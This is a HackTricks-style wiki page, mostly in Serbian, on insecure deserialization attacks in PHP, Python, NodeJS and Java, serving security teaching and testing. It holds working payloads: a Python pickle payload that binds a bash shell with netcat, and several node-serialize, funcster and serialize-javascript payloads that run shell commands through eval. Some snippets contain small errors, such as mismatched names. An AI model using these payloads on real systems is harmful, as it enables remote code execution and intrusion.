# Deserialization

<details>

<summary><strong>–ù–∞—É—á–∏—Ç–µ —Ö–∞–∫–æ–≤–∞—ö–µ AWS-–∞ –æ–¥ –Ω—É–ª–µ –¥–æ —Ö–µ—Ä–æ—ò–∞ —Å–∞</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–î—Ä—É–≥–∏ –Ω–∞—á–∏–Ω–∏ –¥–∞ –ø–æ–¥—Ä–∂–∏—Ç–µ HackTricks:

* –ê–∫–æ –∂–µ–ª–∏—Ç–µ –¥–∞ –≤–∏–¥–∏—Ç–µ —Å–≤–æ—ò—É **–∫–æ–º–ø–∞–Ω–∏—ò—É —Ä–µ–∫–ª–∞–º–∏—Ä–∞–Ω—É –Ω–∞ HackTricks** –∏–ª–∏ **–ø—Ä–µ—É–∑–º–µ—Ç–µ HackTricks —É PDF-—É** –ü—Ä–æ–≤–µ—Ä–∏—Ç–µ [**–ü–†–ï–¢–ü–õ–ê–¢–ù–ï –ü–õ–ê–ù–û–í–ï**](https://github.com/sponsors/carlospolop)!
* –ù–∞–±–∞–≤–∏—Ç–µ [**–∑–≤–∞–Ω–∏—á–Ω–∏ PEASS & HackTricks —Å—É–≤–µ–Ω–∏—Ä**](https://peass.creator-spring.com)
* –û—Ç–∫—Ä–∏—ò—Ç–µ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü–∏—ò—É –µ–∫—Å–∫–ª—É–∑–∏–≤–Ω–∏—Ö [**NFT-–æ–≤–∞**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏–¥—Ä—É–∂–∏—Ç–µ —Å–µ** üí¨ [**Discord –≥—Ä—É–ø–∏**](https://discord.gg/hRep4RUj7f) –∏–ª–∏ [**—Ç–µ–ª–µ–≥—Ä–∞–º –≥—Ä—É–ø–∏**](https://t.me/peass) –∏–ª–∏ **–ø—Ä–∞—Ç–∏—Ç–µ** –Ω–∞—Å –Ω–∞ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥–µ–ª–∏—Ç–µ —Å–≤–æ—ò–µ —Ö–∞–∫–µ—Ä—Å–∫–µ —Ç—Ä–∏–∫–æ–≤–µ —Å–ª–∞—ö–µ–º PR-–æ–≤–∞ –Ω–∞** [**HackTricks**](https://github.com/carlospolop/hacktricks) –∏ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏—ò—É–º–µ.

</details>

## –û—Å–Ω–æ–≤–Ω–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—ò–µ

**–°–µ—Ä–∏—ò–∞–ª–∏–∑–∞—Ü–∏—ò–∞** —Å–µ —Å–º–∞—Ç—Ä–∞ –º–µ—Ç–æ–¥–æ–º –ø—Ä–µ—Ç–≤–∞—Ä–∞—ö–∞ –æ–±—ò–µ–∫—Ç–∞ —É —Ñ–æ—Ä–º–∞—Ç –∫–æ—ò–∏ —Å–µ –º–æ–∂–µ —á—É–≤–∞—Ç–∏, —Å–∞ –Ω–∞–º–µ—Ä–æ–º –¥–∞ —Å–µ –æ–±—ò–µ–∫–∞—Ç –∏–ª–∏ —Å–∞—á—É–≤–∞ –∏–ª–∏ –ø—Ä–µ–Ω–µ—Å–µ –∫–∞–æ –¥–µ–æ –∫–æ–º—É–Ω–∏–∫–∞—Ü–∏–æ–Ω–æ–≥ –ø—Ä–æ—Ü–µ—Å–∞. –û–≤–∞ —Ç–µ—Ö–Ω–∏–∫–∞ —Å–µ —á–µ—Å—Ç–æ –∫–æ—Ä–∏—Å—Ç–∏ –¥–∞ –±–∏ —Å–µ –æ—Å–∏–≥—É—Ä–∞–ª–æ –¥–∞ –æ–±—ò–µ–∫–∞—Ç –º–æ–∂–µ –±–∏—Ç–∏ —Ä–µ–∫–æ–Ω—Å—Ç—Ä—É–∏—Å–∞–Ω —É –∫–∞—Å–Ω–∏—ò–µ–º –≤—Ä–µ–º–µ–Ω—É, —á—É–≤–∞—ò—É—õ–∏ —ö–µ–≥–æ–≤—É —Å—Ç—Ä—É–∫—Ç—É—Ä—É –∏ —Å—Ç–∞—ö–µ.

**–î–µ—Å–µ—Ä–∏—ò–∞–ª–∏–∑–∞—Ü–∏—ò–∞**, —Å—É–ø—Ä–æ—Ç–Ω–æ, —ò–µ –ø—Ä–æ—Ü–µ—Å –∫–æ—ò–∏ –¥–µ—ò—Å—Ç–≤—É—ò–µ –ø—Ä–æ—Ç–∏–≤ —Å–µ—Ä–∏—ò–∞–ª–∏–∑–∞—Ü–∏—ò–µ. –£–∫—ô—É—á—É—ò–µ –ø—Ä–µ—É–∑–∏–º–∞—ö–µ –ø–æ–¥–∞—Ç–∞–∫–∞ –∫–æ—ò–∏ —Å—É —Å—Ç—Ä—É–∫—Ç—É—Ä–∏—Ä–∞–Ω–∏ —É –æ–¥—Ä–µ—í–µ–Ω–æ–º —Ñ–æ—Ä–º–∞—Ç—É –∏ —Ä–µ–∫–æ–Ω—Å—Ç—Ä—É–∏—Ä–∞—ö–µ –∏—Ö —É –æ–±—ò–µ–∫–∞—Ç.

–î–µ—Å–µ—Ä–∏—ò–∞–ª–∏–∑–∞—Ü–∏—ò–∞ –º–æ–∂–µ –±–∏—Ç–∏ –æ–ø–∞—Å–Ω–∞ —ò–µ—Ä –ø–æ—Ç–µ–Ω—Ü–∏—ò–∞–ª–Ω–æ **–æ–º–æ–≥—É—õ–∞–≤–∞ –Ω–∞–ø–∞–¥–∞—á–∏–º–∞ –¥–∞ –º–∞–Ω–∏–ø—É–ª–∏—à—É —Å–µ—Ä–∏—ò–∞–ª–∏–∑–æ–≤–∞–Ω–∏–º –ø–æ–¥–∞—Ü–∏–º–∞ –¥–∞ –∏–∑–≤—Ä—à–µ —à—Ç–µ—Ç–∞–Ω –∫–æ–¥** –∏–ª–∏ –∏–∑–∞–∑–æ–≤—É –Ω–µ–æ—á–µ–∫–∏–≤–∞–Ω–æ –ø–æ–Ω–∞—à–∞—ö–µ —É –∞–ø–ª–∏–∫–∞—Ü–∏—ò–∏ —Ç–æ–∫–æ–º –ø—Ä–æ—Ü–µ—Å–∞ —Ä–µ–∫–æ–Ω—Å—Ç—Ä—É–∫—Ü–∏—ò–µ –æ–±—ò–µ–∫—Ç–∞.

## PHP

–£ PHP-—É —Å–µ –∫–æ—Ä–∏—Å—Ç–µ —Å–ø–µ—Ü–∏—Ñ–∏—á–Ω–µ –º–∞–≥–∏—á–Ω–µ –º–µ—Ç–æ–¥–µ –∑–∞ —Å–µ—Ä–∏—ò–∞–ª–∏–∑–∞—Ü–∏—ò—É –∏ –¥–µ—Å–µ—Ä–∏—ò–∞–ª–∏–∑–∞—Ü–∏—ò—É:

* `__sleep`: –ü–æ–∑–≤–∞–Ω –∫–∞–¥–∞ —Å–µ –æ–±—ò–µ–∫–∞—Ç —Å–µ—Ä–∏—ò–∞–ª–∏–∑—É—ò–µ. –û–≤–∞—ò –º–µ—Ç–æ–¥ —Ç—Ä–µ–±–∞ –≤—Ä–∞—Ç–∏—Ç–∏ –Ω–∏–∑ –∏–º–µ–Ω–∞ —Å–≤–∏—Ö —Å–≤–æ—ò—Å—Ç–∞–≤–∞ –æ–±—ò–µ–∫—Ç–∞ –∫–æ—ò–µ —Ç—Ä–µ–±–∞ —Å–µ—Ä–∏—ò–∞–ª–∏–∑–æ–≤–∞—Ç–∏. –ß–µ—Å—Ç–æ —Å–µ –∫–æ—Ä–∏—Å—Ç–∏ –∑–∞ –∏–∑–≤—Ä—à–∞–≤–∞—ö–µ –Ω–µ—Ä–µ—à–µ–Ω–∏—Ö –ø–æ–¥–∞—Ç–∞–∫–∞ –∏–ª–∏ –∏–∑–≤—Ä—à–∞–≤–∞—ö–µ —Å–ª–∏—á–Ω–∏—Ö –∑–∞–¥–∞—Ç–∞–∫–∞ –∑–∞ —á–∏—à—õ–µ—ö–µ.
* `__wakeup`: –ü–æ–∑–≤–∞–Ω –∫–∞–¥–∞ —Å–µ –æ–±—ò–µ–∫–∞—Ç –¥–µ—Å–µ—Ä–∏—ò–∞–ª–∏–∑—É—ò–µ. –ö–æ—Ä–∏—Å—Ç–∏ —Å–µ –∑–∞ –ø–æ–Ω–æ–≤–Ω–æ —É—Å–ø–æ—Å—Ç–∞–≤—ô–∞—ö–µ –±–∏–ª–æ –∫–æ—ò–∏—Ö –≤–µ–∑–∞ —Å–∞ –±–∞–∑–æ–º –ø–æ–¥–∞—Ç–∞–∫–∞ –∫–æ—ò–µ —Å—É –º–æ–∂–¥–∞ –∏–∑–≥—É–±—ô–µ–Ω–µ –ø—Ä–∏ —Å–µ—Ä–∏—ò–∞–ª–∏–∑–∞—Ü–∏—ò–∏ –∏ –∏–∑–≤—Ä—à–∞–≤–∞—ö–µ –¥—Ä—É–≥–∏—Ö –∑–∞–¥–∞—Ç–∞–∫–∞ –∑–∞ –ø–æ–Ω–æ–≤–Ω–æ –∏–Ω–∏—Ü–∏—ò–∞–ª–∏–∑–æ–≤–∞—ö–µ.
* `__unserialize`: –û–≤–∞—ò –º–µ—Ç–æ–¥ —Å–µ –ø–æ–∑–∏–≤–∞ —É–º–µ—Å—Ç–æ `__wakeup` (–∞–∫–æ –ø–æ—Å—Ç–æ—ò–∏) –∫–∞–¥–∞ —Å–µ –æ–±—ò–µ–∫–∞—Ç –¥–µ—Å–µ—Ä–∏—ò–∞–ª–∏–∑—É—ò–µ. –û–Ω –ø—Ä—É–∂–∞ –≤–µ—õ—É –∫–æ–Ω—Ç—Ä–æ–ª—É –Ω–∞–¥ –ø—Ä–æ—Ü–µ—Å–æ–º –¥–µ—Å–µ—Ä–∏—ò–∞–ª–∏–∑–∞—Ü–∏—ò–µ —É–ø–æ—Ä–µ—í–µ–Ω–æ —Å–∞ `__wakeup`.
* `__destruct`: –û–≤–∞—ò –º–µ—Ç–æ–¥ —Å–µ –ø–æ–∑–∏–≤–∞ –∫–∞–¥–∞ —ò–µ –æ–±—ò–µ–∫–∞—Ç –Ω–∞ –∏–∑–º–∞–∫—É –∏–ª–∏ –∫–∞–¥–∞ —Å–µ —Å–∫—Ä–∏–ø—Ç–∞ –∑–∞–≤—Ä—à–∞–≤–∞. –û–±–∏—á–Ω–æ —Å–µ –∫–æ—Ä–∏—Å—Ç–∏ –∑–∞ –∑–∞–¥–∞—Ç–∫–µ —á–∏—à—õ–µ—ö–∞, –∫–∞–æ —à—Ç–æ —ò–µ –∑–∞—Ç–≤–∞—Ä–∞—ö–µ –¥–∞—Ç–æ—Ç–µ–∫–∞ –∏–ª–∏ –≤–µ–∑–∞ —Å–∞ –±–∞–∑–æ–º –ø–æ–¥–∞—Ç–∞–∫–∞.
* `__toString`: –û–≤–∞—ò –º–µ—Ç–æ–¥ –æ–º–æ–≥—É—õ–∞–≤–∞ –¥–∞ —Å–µ –æ–±—ò–µ–∫–∞—Ç —Ç—Ä–µ—Ç–∏—Ä–∞ –∫–∞–æ –Ω–∏–∑ –∑–Ω–∞–∫–æ–≤–∞. –ú–æ–∂–µ —Å–µ –∫–æ—Ä–∏—Å—Ç–∏—Ç–∏ –∑–∞ —á–∏—Ç–∞—ö–µ –¥–∞—Ç–æ—Ç–µ–∫–µ –∏–ª–∏ –¥—Ä—É–≥–µ –∑–∞–¥–∞—Ç–∫–µ –Ω–∞ –æ—Å–Ω–æ–≤—É –ø–æ–∑–∏–≤–∞ —Ñ—É–Ω–∫—Ü–∏—ò–∞ —É–Ω—É—Ç–∞—Ä —ö–µ–≥–∞, –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ –ø—Ä—É–∂–∞—ò—É—õ–∏ —Ç–µ–∫—Å—Ç—É–∞–ª–Ω–∏ –ø—Ä–∏–∫–∞–∑ –æ–±—ò–µ–∫—Ç–∞.

```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```

Ako pogledate rezultate, mo≈æete videti da se funkcije **`__wakeup`** i **`__destruct`** pozivaju prilikom deserializacije objekta. Napomena: u nekoliko tutorijala ƒáete videti da se funkcija **`__toString`** poziva prilikom poku≈°aja ≈°tampanja nekog atributa, ali izgleda da se to **vi≈°e ne de≈°ava**.

{% hint style="warning" %}
Metoda **`__unserialize(array $data)`** se poziva **umesto `__wakeup()`** ako je implementirana u klasi. Omoguƒáava vam da deserijalizujete objekat pru≈æajuƒái serijske podatke kao niz. Mo≈æete koristiti ovu metodu da deserijalizujete svojstva i obavite sve neophodne zadatke prilikom deserijalizacije.

```php
class MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

Mo≈æete proƒçitati obja≈°njeni **PHP primer ovde**: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), ovde [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) ili ovde [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Classes

Mo≈æete zloupotrebiti PHP autoload funkcionalnost da biste uƒçitali proizvoljne PHP fajlove i jo≈° mnogo toga:

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### Serijalizacija referenciranih vrednosti

Ako iz nekog razloga ≈æelite da serijalizujete vrednost kao **referencu na drugu serijalizovanu vrednost**, mo≈æete:

```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```

### PHPGGC (ysoserial za PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) mo≈æe vam pomoƒái da generi≈°ete payload-ove za zloupotrebu PHP deserijalizacije.\
Imajte na umu da u nekoliko sluƒçajeva **neƒáete moƒái pronaƒái naƒçin za zloupotrebu deserijalizacije u izvornom kodu** aplikacije, ali mo≈æda ƒáete moƒái **zloupotrebiti kod spoljnih PHP ekstenzija.**\
Dakle, ako mo≈æete, proverite `phpinfo()` servera i **pretra≈æite internet** (ƒçak i **gad≈æete** iz **PHPGGC**) neke moguƒáe gad≈æete koje biste mogli zloupotrebiti.

### deserijalizacija metapodataka phar://

Ako ste prona≈°li LFI koji samo ƒçita datoteku i ne izvr≈°ava PHP kod unutar nje, na primer koristeƒái funkcije poput _**file\_get\_contents(), fopen(), file() ili file\_exists(), md5\_file(), filemtime() ili filesize()**_**.** Mo≈æete poku≈°ati zloupotrebiti **deserijalizaciju** koja se de≈°ava prilikom **ƒçitanja** datoteke koristeƒái **phar** protokol.\
Za vi≈°e informacija proƒçitajte sledeƒái post:

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

Kada se objekat depiklira, funkcija _\_\_reduce\_\__ ƒáe biti izvr≈°ena.\
Kada se iskoristi, server mo≈æe vratiti gre≈°ku.

```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```

Za vi≈°e informacija o bekstvu iz **pickle zatvora** pogledajte:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **&** jsonpickle

Na sledeƒáoj stranici je prikazana tehnika **zloupotrebe nesigurne deserijalizacije u yaml Python bibliotekama** i zavr≈°ava se alatom koji se mo≈æe koristiti za generisanje RCE deserijalizacijskog payloada za **Pickle, PyYAML, jsonpickle i ruamel.yaml**:

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### Zagaƒëenje klase (Python prototip zagaƒëenje)

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### JS Magiƒçne funkcije

JS **nema "magiƒçne" funkcije** poput PHP-a ili Pythona koje ƒáe se izvr≈°iti samo za kreiranje objekta. Ali ima neke **funkcije** koje se **ƒçesto koriste ƒçak i bez direktnog pozivanja** kao ≈°to su **`toString`**, **`valueOf`**, **`toJSON`**.\
Ako zloupotrebite deserijalizaciju, mo≈æete **ugroziti ove funkcije da izvr≈°avaju drugi kod** (potencijalno zloupotrebljavajuƒái zagaƒëenje prototipa) i mo≈æete izvr≈°iti proizvoljni kod kada se one pozovu.

Jo≈° jedan **"magiƒçan" naƒçin pozivanja funkcije** bez direktnog pozivanja je **ugro≈æavanje objekta koji se vraƒáa asinhronom funkcijom** (promise). Jer, ako **transformi≈°ete** taj **vraƒáeni objekat** u drugi **promise** sa **svojstvom** nazvanim **"then" tipa funkcija**, on ƒáe biti **izvr≈°en** samo zato ≈°to je vraƒáen od drugog promise-a. _Pratite_ [_**ovaj link**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _za vi≈°e informacija._

```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```

### `__proto__` –∏ `prototype` zagaƒëenje

Ako ≈æelite da saznate vi≈°e o ovoj tehnici, **pogledajte sledeƒái tutorijal**:

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Ova biblioteka omoguƒáava serijalizaciju funkcija. Primer:

```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```

**Serijalizovani objekat** ƒáe izgledati ovako:

```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```

Mo≈æete videti u primeru da kada se funkcija serijalizuje, flag `_$$ND_FUNC$$_` se dodaje serijalizovanom objektu.

Unutar fajla `node-serialize/lib/serialize.js` mo≈æete pronaƒái isti flag i kako se kod koristi.

![](<../../.gitbook/assets/image (297).png>)

![](<../../.gitbook/assets/image (298).png>)

Kao ≈°to mo≈æete videti u poslednjem delu koda, **ako se flag pronaƒëe**, koristi se `eval` za deserijalizaciju funkcije, tako da se u osnovi **korisniƒçki unos koristi unutar funkcije `eval`**.

Meƒëutim, **samo serijalizacija** funkcije **je neƒáe izvr≈°iti** jer bi bilo potrebno da neki deo koda **poziva `y.rce`** u na≈°em primeru, ≈°to je veoma **neverovatno**.\
U svakom sluƒçaju, mo≈æete jednostavno **izmeniti serijalizovani objekat** dodavanjem zagrada kako biste automatski izvr≈°ili serijalizovanu funkciju prilikom deserijalizacije objekta.\
U sledeƒáem delu koda **primetite poslednje zagrade** i kako ƒáe funkcija `unserialize` automatski izvr≈°iti kod:

```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```

Kao ≈°to je prethodno naznaƒçeno, ova biblioteka ƒáe dobiti kod nakon `_$$ND_FUNC$$_` i **izvr≈°iti ga** koristeƒái `eval`. Stoga, kako biste **automatski izvr≈°ili kod**, mo≈æete **izbrisati deo kreiranja funkcije** i poslednju zagradu i **samo izvr≈°iti JS jednolinijski kod** kao u sledeƒáem primeru:

```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```

Mo≈æete [**ovde pronaƒái**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **dodatne informacije** o tome kako iskoristiti ovu ranjivost.

### [funcster](https://www.npmjs.com/package/funcster)

Znaƒçajan aspekt **funcster**-a je nedostupnost **standardnih ugraƒëenih objekata**; oni su van dosega. Ova restrikcija spreƒçava izvr≈°avanje koda koji poku≈°ava da pozove metode na ugraƒëenim objektima, ≈°to dovodi do izuzetaka poput `"ReferenceError: console is not defined"` kada se koriste komande poput `console.log()` ili `require(something)`.

Uprkos ovoj ograniƒçenosti, moguƒáe je ponovo uspostaviti pun pristup globalnom kontekstu, ukljuƒçujuƒái sve standardne ugraƒëene objekte, kroz odreƒëeni pristup. Kori≈°ƒáenjem globalnog konteksta direktno, moguƒáe je zaobiƒái ovu restrikciju. Na primer, pristup mo≈æe biti ponovo uspostavljen kori≈°ƒáenjem sledeƒáeg iseƒçka koda:

```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```

**Za** [**vi≈°e informacija proƒçitajte ovaj izvor**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

Paket **serialize-javascript** je dizajniran iskljuƒçivo za potrebe serijalizacije, bez ugraƒëenih moguƒánosti za deserijalizaciju. Korisnici su odgovorni za implementaciju sopstvene metode za deserijalizaciju. Direktna upotreba `eval` funkcije je predlo≈æena u zvaniƒçnom primeru za deserijalizaciju serijalizovanih podataka:

```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```

Ako se ova funkcija koristi za de-serijalizaciju objekata, mo≈æete je **lako iskoristiti**:

```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```

**Za**[ **vi≈°e informacija proƒçitajte ovaj izvor**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Cryo biblioteka

Na sledeƒáim stranicama mo≈æete pronaƒái informacije o tome kako zloupotrebiti ovu biblioteku radi izvr≈°avanja proizvoljnih komandi:

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

U Javi, **callback-ovi za deserializaciju se izvr≈°avaju tokom procesa deserializacije**. Ovu izvr≈°avanje mogu iskoristiti napadaƒçi koji kreiraju zlonamerne payload-e koji pokreƒáu ove callback-ove, ≈°to mo≈æe dovesti do potencijalnog izvr≈°avanja ≈°tetnih radnji.

### Otisci

#### Bela kutija

Da biste identifikovali potencijalne ranjivosti deserializacije u kodnoj bazi, pretra≈æite:

* Klase koje implementiraju interfejs `Serializable`.
* Upotrebu funkcija `java.io.ObjectInputStream`, `readObject`, `readUnshare`.

Posebno obratite pa≈ænju na:

* `XMLDecoder` koji se koristi sa parametrima definisanim od strane eksternih korisnika.
* `XStream`-ovu metodu `fromXML`, posebno ako je verzija XStream-a manja ili jednaka 1.46, jer je podlo≈æna problemima sa serijalizacijom.
* `ObjectInputStream` uparen sa metodom `readObject`.
* Implementaciju metoda poput `readObject`, `readObjectNodData`, `readResolve` ili `readExternal`.
* `ObjectInputStream.readUnshared`.
* Op≈°tu upotrebu `Serializable`.

#### Crna kutija

Za testiranje crne kutije, potra≈æite specifiƒçne **potpise ili "Magic Bytes"** koji oznaƒçavaju java serijalizovane objekte (potiƒçu iz `ObjectInputStream`):

* Heksadecimalni obrazac: `AC ED 00 05`.
* Base64 obrazac: `rO0`.
* HTTP odgovor sa zaglavljem `Content-type` postavljenim na `application/x-java-serialized-object`.
* Heksadecimalni obrazac koji ukazuje na prethodnu kompresiju: `1F 8B 08 00`.
* Base64 obrazac koji ukazuje na prethodnu kompresiju: `H4sIA`.
* Veb fajlove sa ekstenzijom `.faces` i parametrom `faces.ViewState`. Otkrivanje ovih obrazaca u veb aplikaciji trebalo bi da pokrene pregled kao ≈°to je detaljno opisano u [postu o Java JSF ViewState Deserialization](java-jsf-viewstate-.faces-deserialization.md).

```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```

### Provera da li je ranjiv

Ako ≈æelite da **saznate kako funkcioni≈°e Java Deserialized exploit**, trebali biste pogledati [**Osnovna Java Deserializacija**](basic-java-deserialization-objectinputstream-readobject.md), [**Java DNS Deserializacija**](java-dns-deserialization-and-gadgetprobe.md) i [**CommonsCollection1 Payload**](java-transformers-to-rutime-exec-payload.md).

#### Testiranje belom kutijom

Mo≈æete proveriti da li je instalirana neka aplikacija sa poznatim ranjivostima.

```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```

Mo≈æete poku≈°ati **proveriti sve biblioteke** koje su poznate kao ranjive i za koje [**Ysoserial**](https://github.com/frohoff/ysoserial) mo≈æe pru≈æiti eksploataciju. Ili mo≈æete proveriti biblioteke navedene na [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json).\
Takoƒëe mo≈æete koristiti [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) da biste prona≈°li moguƒáe lance ureƒëaja koji se mogu iskoristiti.\
Kada pokreƒáete **gadgetinspector** (nakon izgradnje), ne brinite o gomili upozorenja/gre≈°aka kroz koje prolazi i pustite ga da zavr≈°i. Sve rezultate ƒáe zapisati u _gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_. Imajte na umu da **gadgetinspector neƒáe stvoriti eksploataciju i mo≈æe pokazivati la≈æne pozitivne rezultate**.

#### Test crne kutije

Koristeƒái Burp ekstenziju [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md), mo≈æete identifikovati **koje biblioteke su dostupne** (ƒçak i verzije). Sa ovim informacijama, moglo bi biti **lak≈°e odabrati payload** za iskori≈°ƒáavanje ranjivosti.\
[**Proƒçitajte ovo da biste saznali vi≈°e o GadgetProbe-u**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe je fokusiran na **`ObjectInputStream` deserializacije**.

Koristeƒái Burp ekstenziju [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner), mo≈æete **identifikovati ranjive biblioteke** koje se mogu iskoristiti sa ysoserial i **iskoristiti** ih.\
[**Proƒçitajte ovo da biste saznali vi≈°e o Java Deserialization Scanner-u.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner je fokusiran na **`ObjectInputStream`** deserializacije.

Takoƒëe mo≈æete koristiti [**Freddy**](https://github.com/nccgroup/freddy) da biste otkrili ranjivosti deserializacije u **Burp**-u. Ovaj dodatak ƒáe otkriti ranjivosti koje se odnose ne samo na **`ObjectInputStream`**, veƒá i na ranjivosti iz biblioteka za deserializaciju **Json** i **Yml**. U aktivnom re≈æimu, poku≈°aƒáe da ih potvrdi kori≈°ƒáenjem sleep ili DNS payloada.\
[**Vi≈°e informacija o Freddy-u mo≈æete pronaƒái ovde.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**Testiranje serijalizacije**

Nije sve u proveri da li server koristi ranjive biblioteke. Ponekad mo≈æete **promeniti podatke unutar serijalizovanog objekta i zaobiƒái neke provere** (mo≈æda vam omoguƒáiti administratorske privilegije unutar veb aplikacije).\
